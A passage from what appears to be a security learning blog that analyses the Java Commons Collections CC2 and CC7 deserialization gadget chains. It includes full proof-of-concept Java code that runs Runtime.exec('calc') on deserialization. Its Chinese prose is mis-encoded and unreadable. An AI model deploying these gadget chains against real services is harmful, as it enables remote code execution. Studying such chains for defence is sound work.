//æ›´æ”¹ç±»åï¼Œä½†æ˜¯åº”è¯¥ç›´æ¥ç”¨Catå°±è¡Œäº†ï¼Œä½†æ˜¯ç”¨æ¥ç¡®ä¿å”¯ä¸€æ€§ä¹Ÿæ˜¯å¯ä»¥çš„ cc.setName(randomClassName); //è®¾ç½®ccç±»çš„çˆ¶ç±» cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //cc.writeFile(\u0026#34;output\u0026#34;); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); Object[] queue_array = new Object[]{templates,1}; Field queue_field = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;queue\u0026#34;); queue_field.setAccessible(true); queue_field.set(queue,queue_array); Field size = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;size\u0026#34;); size.setAccessible(true); size.set(queue,2); ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); inputStream.readObject(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } æˆåŠŸæŒ‰ç…§é¢„æœŸå¼¹å‡ºä¸€ä¸ªè®¡ç®—æœºã€‚\nç¨å¾®æ”¹ä¸€ç‚¹javassistä»£ç å°±å¯ä»¥å¾—åˆ°æ„é€ å‡ºæ¥çš„ç±»ä¸ºï¼š è¿˜æœ‰ä¸€ä¸ªç‚¹å°±æ˜¯ä¸ºä»€ä¹ˆåœ¨åŠ¨æ€åŠ è½½å­—èŠ‚ç é‚£é‡Œä¼šå°‘ä¸€è¡Œï¼Œè¿™æ˜¯å› ä¸ºTemplatesImplç±»çš„readObject()æ–¹æ³•æœ‰å®šä¹‰ï¼š åœ¨æ„é€ ä»£ç æ—¶ä¹Ÿå¯ä»¥åŠ ä¸Šï¼ŒåƒCC3é‚£æ ·ã€‚\nä½†æ˜¯æˆ‘æœ‰ç‚¹å°å¥‡æ€ªçš„å°±æ˜¯ä¸ºå•¥ä¸ç”¨åœ¨æ¯”å¦‚Catç±»é‡å†™é‚£ä¸¤ä¸ªtransform()æ–¹æ³•ï¼Œä½†æ˜¯æ— æ‰€è°“ï¼Œå°±ç®—ä¸èƒ½ç”¨ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨javassistå°†transform()æ–¹æ³•æ·»åŠ ä¸Šå»å³å¯ã€‚\n","date":"2024-07-25T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/cc2/","title":"CC2"},{"content":"CC7 CC7çš„æ€è·¯åŒæ ·æ˜¯æ‰¾å¦ä¸€æ¡è°ƒç”¨é“¾æ¥è§¦å‘lazy.get()æ–¹æ³•ï¼Œè¿™æ¬¡ç”¨åˆ°çš„æ˜¯Hashtableç±»\næµ‹è¯•ç¯å¢ƒï¼š\nJDK 8u411 commons-collections 3.2.1 ä»£ç åˆ†æ åœ¨ysoserialç»™å‡ºçš„è°ƒç”¨é“¾ä¸­ï¼Œé€‰å–äº†java.util.Hashtable#readObjectæ–¹æ³•ä½œä¸ºè°ƒç”¨é“¾çš„èµ·ç‚¹ã€‚\nHashtable ä¸ HashMapå¾ˆç›¸ä¼¼ï¼Œéƒ½æ˜¯ä¸€ç§key-valueå½¢å¼çš„å“ˆå¸Œè¡¨ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰åŒºåˆ«ï¼š\nHashMap ä¸ Hashtableçš„çˆ¶ç±»ä¸ä¸€æ ·ã€‚ ä¸¤è€…å†…éƒ¨åŸºæœ¬éƒ½æ˜¯ä½¿ç”¨â€œæ•°ç»„-é“¾è¡¨â€çš„ç»“æ„ï¼Œä½†æ˜¯ HashMap å¼•å…¥äº†çº¢é»‘æ ‘çš„å®ç°ã€‚ Hashtable çš„key-value ä¸å…è®¸ä¸ºnullå€¼ï¼Œä½†æ˜¯HashMap æ˜¯å…è®¸çš„ï¼Œåè€…ä¼šå°† key=valueçš„å®ä½“æ”¾åœ¨index=0 çš„ä½ç½®ã€‚ Hashtable çº¿ç¨‹å®‰å…¨ï¼ŒHashMap çº¿ç¨‹ä¸å®‰å…¨ã€‚ åŒæ ·çš„ï¼Œæ—¢ç„¶HashMapå¯ä»¥å®ç°ååºåˆ—åŒ–æ¼æ´ï¼ŒHashtableåŒæ ·å¯ä»¥ã€‚\nåˆ†ææºç ï¼Œè¿™ä¸ªHashtableç±»å¯ä»¥ç»™å‡ºä¸¤æ¡é“¾ï¼Œåˆ†åˆ«æ˜¯\nreadObject()ä¸­çš„reconstitution()çš„hashCode()æ–¹æ³• readObject()ä¸­çš„reconstitution()çš„equal()æ–¹æ³• hashCode ï¼ˆå…¶å®ç»™è¿™ä¸ªéƒ½å¯ä»¥ç®—åˆ°CC6é‚£é‡Œå»ï¼Œåˆ©ç”¨æ€è·¯å’ŒCC6å·®ä¸å¤šï¼‰\næˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹Hashtableçš„readObject()æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException { ObjectInputStream.GetField fields = s.readFields(); float lf = fields.get(\u0026#34;loadFactor\u0026#34;, 0.75f); if (lf \u0026lt;= 0 || Float.isNaN(lf)) throw new StreamCorruptedException(\u0026#34;Illegal load factor: \u0026#34; + lf); lf = Math.min(Math.max(0.25f, lf), 4.0f); int origlength = s.readInt(); int elements = s.readInt(); if (elements \u0026lt; 0) throw new StreamCorruptedException(\u0026#34;Illegal # of Elements: \u0026#34; + elements); origlength = Math.max(origlength, (int)(elements / lf) + 1); int length = (int)((elements + elements / 20) / lf) + 3; if (length \u0026gt; elements \u0026amp;\u0026amp; (length \u0026amp; 1) == 0) length--; length = Math.min(length, origlength); if (length \u0026lt; 0) { // overflow length = origlength; } SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, length); Hashtable.UnsafeHolder.putLoadFactor(this, lf); table = new Entry\u0026lt;?,?\u0026gt;[length]; threshold = (int)Math.min(length * lf, MAX_ARRAY_SIZE + 1); count = 0; for (; elements \u0026gt; 0; elements--) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) K key = (K)s.readObject(); @SuppressWarnings(\u0026#34;unchecked\u0026#34;) V value = (V)s.readObject(); // sync is eliminated for performance reconstitutionPut(table, key, value); } } é‡ç‚¹è¿˜æ˜¯æœ€åé¢é‚£ä¸²ä»£ç ï¼Œå¦‚ä¸‹ï¼š åœ¨readObjectæ–¹æ³•ä¸­ï¼Œæœ€åè°ƒç”¨äº†reconstitutionPutæ–¹æ³•å°†ååºåˆ—åŒ–å¾—åˆ°çš„key-value æ”¾åœ¨å†…éƒ¨å®ç°çš„ Entry æ•°ç»„ tableé‡Œã€‚\nè·Ÿè¿›reconstitutionPutæ–¹æ³•æºç ï¼š\nå¯ä»¥çœ‹è§è¿™ä¸ªreconstitutionPut()é‡Œé¢ä¹Ÿè°ƒç”¨äº†hashCodeï¼Œå¹¶ä¸”å¯ä»¥å¾ˆå®¹æ˜“çœ‹å‡ºvalueä¸èƒ½ä¸ºnullã€‚æ„Ÿè§‰å’ŒHashMapæ˜¯å·®ä¸å¤šçš„ï¼Œçœ‹ä¸€ä¸‹Hashtableç±»çš„put()æ–¹æ³•ï¼š å’ŒCC6é‚£å°±å·®ä¸å¤šäº†ï¼Œè¿™ä¸å°±ç›´æ¥å¯ä»¥æ„é€ äº†å—\nç›´æ¥æŒ‰ç…§CC6çš„HashMapçš„é“¾å­åŸç†æ„é€ ä»£ç å³å¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; import java.lang.reflect.Field; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); Hashtable hashMap = new Hashtable(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); haha.remove(\u0026#34;fupanc\u0026#34;);//è¿™é‡Œæ³¨æ„fupancæ‰€å±å¯¹è±¡ï¼Œä½¿ç”¨lazyä¹Ÿè¡Œ Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”\nequals ä½†æ˜¯ysoserialé“¾ä¸­çš„åˆ©ç”¨ç‚¹å´ä¸æ˜¯ä¸Šé¢é‚£ä¸ªç®€å•é“¾ï¼Œç»§ç»­åˆ†æè¿™ä¸ªHashtableç±»çš„ä»£ç ã€‚\nå…ˆç»™å‡ºåˆ©ç”¨é“¾è¦ç”¨åˆ°çš„ç±»ä»¥åŠå¯¹åº”æ–¹æ³•çš„æºç ï¼š\nHashMapçš„çˆ¶ç±»AbstractMapç±»çš„equals()æ–¹æ³•æºç ï¼ˆgetæ–¹æ³•çš„èµ·ç‚¹ï¼‰ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 public boolean equals(Object o) { if (o == this) return true; if (!(o instanceof Map)) return false; Map\u0026lt;?,?\u0026gt; m = (Map\u0026lt;?,?\u0026gt;) o; if (m.size() != size()) return false; try { Iterator\u0026lt;Entry\u0026lt;K,V\u0026gt;\u0026gt; i = entrySet().iterator(); while (i.hasNext()) { Entry\u0026lt;K,V\u0026gt; e = i.next(); K key = e.getKey(); V value = e.getValue(); if (value == null) { if (!(m.get(key)==null \u0026amp;\u0026amp; m.containsKey(key))) return false; } else { if (!value.equals(m.get(key)))//è¿™é‡Œè°ƒç”¨äº†getæ–¹æ³• return false; } } } catch (ClassCastException unused) { return false; } catch (NullPointerException unused) { return false; } return true; } LazyMapçš„çˆ¶ç±»AbstractMapDecoratorçš„equals()æ–¹æ³•æºç ï¼š\n1 2 3 public boolean equals(Object object) { return object == this ? true : this.map.equals(object); } åœ¨Hashtable çš„readObject() æ–¹æ³•ä¸­ç”¨åˆ°äº†forå¾ªç¯ï¼Œå¦‚ä¸‹ï¼š\nè¿™é‡Œçš„elementsä»£è¡¨é”®å€¼å¯¹çš„ä¸ªæ•°ï¼Œè¿™é‡Œè°ƒç”¨forå¾ªç¯æ¥ä¸€æ¬¡è¯»å–ä¸€ä¸ªé”®å€¼å¯¹ã€‚å¹¶ä¸”åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œtable(ä¹Ÿå°±æ˜¯reconstitutionæ–¹æ³•å†…çš„tab)æ˜¯å…±äº«çš„ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨æ•´ä¸ªååºåˆ—åŒ–è¿‡ç¨‹ä¸­å§‹ç»ˆä½¿ç”¨åŒä¸€ä¸ª tabï¼Œæ‰€æœ‰çš„é”®å€¼å¯¹éƒ½å°†è¢«æ’å…¥åˆ°åŒä¸€ä¸ª tab ä¸­ï¼Œæ„æˆä¸€ä¸ªå®Œæ•´çš„å“ˆå¸Œè¡¨ï¼Œå¹¶ä¸”çœ‹Hashtableç±»ä¸­ä¹Ÿæœ‰è¿™ä¸ªå˜é‡ï¼š\ntableåœ¨Hashtableä¹Ÿæ˜¯æœ‰å®šä¹‰çš„ï¼Œç»“åˆå‰é¢çš„è¯´æ˜ï¼Œå¯ä»¥çŸ¥é“åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šå°†é”®å€¼å¯¹æ”¾å…¥åˆ°è¿™ä¸ªæ•°ç»„ä¸­ï¼Œä½†æ˜¯è¿™é‡Œçš„tableæ˜¯transientä¿®é¥°çš„ï¼Œå¯¼è‡´ä¸ä¼šè¢«åºåˆ—åŒ–ï¼Œé‚£ä¹ˆè¿™æ˜¯å¦‚ä½•è§£å†³çš„å‘¢ï¼Ÿé‡ç‚¹å°±æ˜¯åœ¨Hashtable#writeObject()æ–¹æ³•ï¼Œæºç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 private void writeObject(java.io.ObjectOutputStream s) throws IOException { Entry\u0026lt;Object, Object\u0026gt; entryStack = null; synchronized (this) { s.defaultWriteObject(); s.writeInt(table.length); s.writeInt(count); for (int index = 0; index \u0026lt; table.length; index++) { Entry\u0026lt;?,?\u0026gt; entry = table[index]; while (entry != null) { entryStack = new Entry\u0026lt;\u0026gt;(0, entry.key, entry.value, entryStack); entry = entry.next; } } } while (entryStack != null) { s.writeObject(entryStack.key); s.writeObject(entryStack.value); entryStack = entryStack.next; } } åœ¨è¿™ä¸ªwriteObject()æ–¹æ³•ä¸­ï¼Œå®šä¹‰äº†ä¸€ä¸ªentryStackç”¨äºæš‚æ—¶å­˜å‚¨æ‰€æœ‰çš„é”®å€¼å¯¹ï¼Œèµ‹å€¼å°±æ˜¯åœ¨forå¾ªç¯ä¸­ï¼Œåœ¨è¿™ä¸ªforå¾ªç¯ä¸­ï¼Œéå†tableæ•°ç»„çš„æ¯ä¸ªEntryå¯¹è±¡ï¼Œå°†å…¶å¡«å…¥entryStackæ•°ç»„ä¸­ï¼Œæœ€ååœ¨whileå¾ªç¯ä¸­å°†æ¯ä¸ªé”®å€¼å¯¹åºåˆ—åŒ–ã€‚\nç»§ç»­çœ‹reconstitutionput()æ–¹æ³•ï¼š\nè¿™ä¸ªforå¾ªç¯ä»£ç ä¼šéå†é“¾è¡¨ï¼Œç›´åˆ°é“¾è¡¨æœ«å°¾ã€‚åŒæ—¶åœ¨forå¾ªç¯å†…éƒ¨ï¼Œå¯ä»¥çœ‹åˆ°åªè¦å½“å‰èŠ‚ç‚¹çš„å“ˆå¸Œå€¼ä¸ç›®æ ‡å“ˆå¸Œå€¼ç›¸ç­‰ä»¥åŠå½“å‰èŠ‚ç‚¹çš„é”®ä¸ç›®æ ‡é”®ç›¸ç­‰å°±ä¼šæŠ›å‡ºå¼‚å¸¸\næ‰€ä»¥è¿™ä¸ªä»£ç çš„ä½œç”¨å°±æ˜¯ç¡®ä¿å“ˆå¸Œè¡¨ä¸­ä¸ä¼šå‡ºç°é‡å¤çš„é”®ã€‚å¦‚æœåœ¨éå†é“¾è¡¨è¿‡ç¨‹ä¸­å‘ç°æœ‰èŠ‚ç‚¹çš„å“ˆå¸Œå€¼å’Œé”®éƒ½ä¸ç›®æ ‡å€¼ç›¸åŒï¼Œå°±ä¼šæŠ›å‡º StreamCorruptedException å¼‚å¸¸ã€‚è¿™å¯èƒ½ç”¨äºåºåˆ—åŒ–/ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œé˜²æ­¢æ•°æ®ç»“æ„è¢«ç ´åæˆ–å‡ºç°ä¸ä¸€è‡´çš„æƒ…å†µã€‚\nå¦‚æœæ²¡æœ‰é‡å¤çš„é”®ï¼Œåœ¨è¿™ä¸ªforå¾ªç¯è¿‡åï¼Œå°†ä¼šå°†è¿™ä¸ªé”®å€¼å¯¹å¡«å…¥åˆ°tableæ•°ç»„ä¸­ï¼š\næ—¢ç„¶è¿™é‡Œéƒ½è¯´æ˜äº†æ˜¯åˆ©ç”¨equal()æ–¹æ³•æ¥åˆ›å»ºåˆ©ç”¨é“¾ï¼Œåœ¨è¿™ä¸ªreconstitutionPut()æ–¹æ³•æºç ä¸­ï¼Œå¯ä»¥çœ‹åˆ°åœ¨forå¾ªç¯é‚£é‡Œè¦åˆ©ç”¨åˆ°äº†equals()æ–¹æ³•ï¼š\nç”±äºjavaä¸­çš„\u0026amp;\u0026amp;æœ‰çŸ­è·¯æ±‚å€¼çš„ç‰¹æ€§ï¼Œå¿…é¡»è¦å‰ä¸€ä¸ªæ¡ä»¶ï¼ˆe.hash == hashï¼‰ä¸ºçœŸï¼Œæ‰ä¼šè¿›è¡Œç¬¬äºŒä¸ªæ¡ä»¶ï¼ˆe.key.equals(key)ï¼‰çš„åˆ¤æ–­ã€‚\næ‰€ä»¥æˆ‘ä»¬è¿™é‡Œè‡³å°‘putè¿›ä¸¤ä¸ªé”®å€¼å¯¹ï¼Œè¿™æ ·åœ¨ç¬¬äºŒä¸ªé”®å€¼å¯¹ä¸ç¬¬ä¸€ä¸ªé”®å€¼å¯¹æ¯”è¾ƒæ—¶æ‰æœ‰å¯èƒ½é€šè¿‡ç¬¬ä¸€ä¸ªæ¡ä»¶ã€‚\nå†ç»“åˆå‰é¢æå‰ç»™å‡ºçš„ç±»ï¼Œå¤§æ¦‚å¯ä»¥çŸ¥é“åˆ©ç”¨é“¾äº†ï¼Œè¿™é‡Œå°†e.keyè®¾ç½®ä¸ºLazyMapç±»å®ä¾‹ï¼Œä½†æ˜¯LazyMapä¸­å¹¶æ²¡æœ‰ç›´æ¥å®šä¹‰equals()æ–¹æ³•ï¼ˆå†…éƒ¨ç±»æœ‰ï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥è°ƒç”¨ï¼‰ï¼Œè¿™æ ·å°±ä¼šè°ƒç”¨LazyMapçš„çˆ¶ç±»AbstractMapDecoratorçš„equals()æ–¹æ³•ï¼š\nè¿™é‡Œçš„this å…³é”®å­—åœ¨æ–¹æ³•ä¸­ä»£è¡¨å½“å‰ç±»çš„å®ä¾‹ï¼Œå³è°ƒç”¨è¯¥æ–¹æ³•çš„å¯¹è±¡ã€‚å¦‚æœç›¸åŒå°±ä¼šç›´æ¥è¿”å›tureï¼Œå¦åˆ™å°±ä¼šè°ƒç”¨åé¢çš„ã€‚è€Œæˆ‘ä»¬çš„åˆ©ç”¨é“¾å°±æ˜¯è¦è°ƒç”¨åé¢çš„ã€‚\nç”±äºæˆ‘ä»¬å®ä¾‹åŒ–LazyMapæ—¶ï¼Œéƒ½æ˜¯ä¼ å…¥ä¸€ä¸ªHashMapç±»å®ä¾‹ï¼Œæœ€ç»ˆä¼šå°†AbstractMapDecoratorçš„this.mapè®¾ç½®ä¸ºHashMapç±»çš„å®ä¾‹åŒ–å¯¹è±¡ï¼Œè¿™æ ·å°±ä¼šè°ƒç”¨HashMapç±»çš„equals()æ–¹æ³•ï¼Œä½†æ˜¯æƒ…å†µåŒLazyMapä¸€æ ·ï¼Œä¼šç›´æ¥è°ƒç”¨çˆ¶ç±»AbstractMapçš„equals()æ–¹æ³•ï¼ˆéƒ¨åˆ†æºç ï¼‰ï¼š\nç„¶ååœ¨AbstractMapçš„equals()æ–¹æ³•ä¸­è°ƒç”¨äº†get()æ–¹æ³•ï¼Œè¿™å°±æ˜¯èµ·ç‚¹ï¼Œå¹¶ä¸”è¿™é‡Œçš„må°±æ˜¯e.key.equals(key)ä¸­çš„ç¬¬äºŒä¸ªkeyï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¼ å…¥ä¸¤ä¸ªLazyMapå®ä¾‹ã€‚\nå¤§æ¦‚å°±æ˜¯è¿™æ ·äº†ï¼Œç°åœ¨æ¥æ“ä»£ç ã€‚\nç»¼åˆå‰é¢çš„é—®é¢˜ï¼š\néœ€è¦ä¼ å…¥ä¸¤ä¸ªé”®å€¼å¯¹ã€‚éœ€è¦å°†e.keyè®¾ç½®ä¸ºLazyMapå¯¹è±¡ï¼Œå³keyéƒ½æ˜¯LazyMapå¯¹è±¡ hashç›¸ç­‰é—®é¢˜ å…ˆç»™ä¸ªåŸºæœ¬ç›˜ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Hashtable; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; import java.lang.reflect.Field; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); Hashtable hashtable = new Hashtable(); //è¿™é‡Œå¼€å§‹æƒ³ä»£ç  Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashtable); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } ç°åœ¨èšç„¦äºreadObject()çš„reconstitutionPutæ–¹æ³•ï¼š\nè¿™é‡Œè¦æ±‚å‰é¢çš„æ¡ä»¶ç›¸ç­‰ï¼Œå¹¶ä¸”åé¢çš„e.keyéœ€è¦ä¸ºLazyMapç±»å®ä¾‹ï¼Œé‚£ä¹ˆæˆ‘å°±ä¼ å…¥ä¸¤ä¸ªLazyMapç±»å®ä¾‹\n1 2 3 4 5 6 7 8 9 10 Transformer haha0 = new ConstantTransformer(1); Transformer haha1 = new ConstantTransformer(1); Map hashMap0 = new HashMap(); Map lazy0 = LazyMap.decorate(hashMap0,haha0); Map hashMap1 = new HashMap(); Map lazy1 = LazyMap.decorate(hashMap1,haha1); Hashtable haha = new Hashtable(); haha.put(lazy0,1); haha.put(lazy1,1); å†ç²˜è¿‡æ¥Hashtableç±»çš„putæ–¹æ³•ä¸€ä¸‹ï¼š è¿™æ ·å°±å¯ä»¥åŸºæœ¬è¯´æ˜ä¸ºä»€ä¹ˆæˆ‘å¯ä»¥è°ƒç”¨Hashtableçš„putæ–¹æ³•äº†ï¼ˆéœ€è¦æ³¨æ„çš„æ˜¯ç¬¬ä¸€æ¬¡putä¸ä¼šè§¦åŠforå¾ªç¯ï¼Œå› ä¸ºtableæ— ä»»ä½•æ¡ç›®ï¼Œç¬¬äºŒæ¬¡putæ‰ä¼šå¼€å§‹æ¯”è¾ƒï¼‰ã€‚\nä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“æˆ‘ä¼ å…¥äº†LazyMapå®ä¾‹ï¼Œæ— è®ºæ˜¯ååºè¿˜æ˜¯putæ–¹æ³•è¿™é‡Œï¼Œåœ¨key.hashCode()éƒ½ä¸ä¼šæ˜¯é¦–å…ˆè°ƒç”¨é»˜è®¤çš„String.javaçš„hashCode()æ–¹æ³•äº†ï¼Œç”±äºLazyMapæ²¡æœ‰å®šä¹‰hashCodeæ–¹æ³•ï¼Œè¿™é‡Œå°±ä¼šåˆ°çˆ¶ç±»AbstractMapDecoratorçš„hashCodeæ–¹æ³•ï¼š\nè¿™é‡Œå°±ä¼šåˆåˆ°HashMapï¼ˆHashMapå†…éƒ¨ç±»æœ‰hashCodeï¼Œä¸å¯ç”¨ï¼‰çˆ¶ç±»AbstractMapçš„hashCode()æ–¹æ³•ï¼š ï¼ˆè¿™é‡Œå¾€åçš„hashCode()æ–¹æ³•è°ƒç”¨è¿‡ç¨‹æ˜¯åé¢çš„æŸä¸ªæµ‹è¯•ä»£ç è°ƒè¯•å‡ºæ¥çš„ï¼Œå¯ä»¥å…ˆåªæš‚æ—¶äº†è§£ï¼‰ç„¶åè¿™é‡Œè°ƒç”¨çš„hashCodeæ˜¯HashMapå†…éƒ¨ç±»Nodeç±»çš„hashCode()æ–¹æ³•ï¼Œå¦‚ä¸‹ï¼š\nç„¶åå·®ä¸å¤šå°±åˆ°äº†String.javaçš„hashCodeæ–¹æ³•ï¼š\nString.javaçš„hashCode()å°±æ˜¯ç”¨æ¥è®¡ç®—å“ˆå¸Œç çš„ã€‚åŒæ—¶æ³¨æ„ï¼ˆé‡è¦ï¼‰ï¼šåœ¨ä¸Šä¸Šé¢é‚£ä¸ªhashCode()ï¼Œä¹Ÿå°±æ˜¯å†…éƒ¨ç±»Nodeçš„hashCode()æ–¹æ³•å¯¹keyå’Œvalueéƒ½è°ƒç”¨äº†hashCode()è®¡ç®—å“ˆå¸Œç åå¼‚æˆ–æ±‚å¾—å€¼ï¼Œä¹Ÿå°±æ˜¯æœ€ç»ˆçš„å“ˆå¸Œç ï¼Œæ‰€ä»¥å¯¹äºæœ€ç»ˆçš„å“ˆå¸Œç æˆ‘ä»¬éœ€è¦å…¼é¡¾é”®å’Œå€¼ã€‚\nâ€”â€”â€”â€”\nç»“åˆString.javaçš„hashCodeæ–¹æ³•ï¼Œå¯ä»¥çŸ¥é“AbstractMapçš„hashCodeæ–¹æ³•çš„ä½œç”¨å°±æ˜¯è®¡ç®—å“ˆå¸Œç ï¼Œé€šè¿‡è¿­ä»£å™¨éå†æ¯ä¸ªæ¡ç›®ï¼Œè°ƒç”¨æ¯ä¸ªæ¡ç›®çš„hashCode()æ–¹æ³•ï¼Œç„¶åå°†å¾—åˆ°çš„å“ˆå¸Œç ç´¯åŠ åˆ°å˜é‡hä¸­ã€‚æœ€åè¿”å›hã€‚\nä½†æ˜¯ç”±äºæˆ‘ä»¬æœ€å¼€å§‹è°ƒç”¨çš„hashCode()æ˜¯LazyMapå¯¹è±¡ï¼Œå¹¶ä¸”ç”±äºè¿™ä¸ªå¯¹è±¡é‡Œé¢å¹¶æ²¡æœ‰å­˜å‚¨æœ‰é”®å€¼å¯¹ï¼Œæ‰€ä»¥è¿™é‡Œä¼šç›´æ¥è¿”å›0ã€‚\næœ¬æ¥æˆ‘è¿˜ä»¥ä¸ºåˆšå¥½ï¼Œè¿™æ ·éƒ½è¿”å›0çš„è¯æ­£å¥½ä½¿å¾—e.hash=hashå¯ä»¥æˆç«‹ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“æˆ‘ä»¬åœ¨åºåˆ—åŒ–ä¹‹å‰è°ƒç”¨put()çš„æ—¶å€™ï¼Œçœ‹put()æ–¹æ³•çš„å¦‚ä¸‹æºç ï¼š\nä»–è¿™é‡Œä¹Ÿæœ‰ä¸ªforå¾ªç¯æ¥é˜²æ­¢æœ‰é‡å¤çš„é”®ï¼Œè¿™ä¸ªä»£ç çš„ä½œç”¨å°±æ˜¯å¦‚æœæ¡ä»¶æˆç«‹ï¼Œä¹Ÿå°±æ˜¯æ¡ç›®ç›¸åŒ¹é…ï¼Œå°±ä¼šå°†æ¡ç›®entryå¯¹åº”çš„é”®çš„valueæ›´æ”¹ä¸ºæ–°çš„valueã€‚å†æ¥çœ‹æˆ‘ä»¬çš„ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 Transformer haha0 = new ConstantTransformer(1); Transformer haha1 = new ConstantTransformer(1); Map hashMap0 = new HashMap(); Map lazy0 = LazyMap.decorate(hashMap0,haha0); Map hashMap1 = new HashMap(); Map lazy1 = LazyMap.decorate(hashMap1,haha1); Hashtable haha = new Hashtable(); haha.put(lazy0,1); haha.put(lazy1,1); ç°åœ¨çš„é—®é¢˜å°±æ˜¯æƒ³è¿™ä¸ªentry.key.equals(key)æ˜¯å¦ä¼šé€šè¿‡å¯¼è‡´æ— 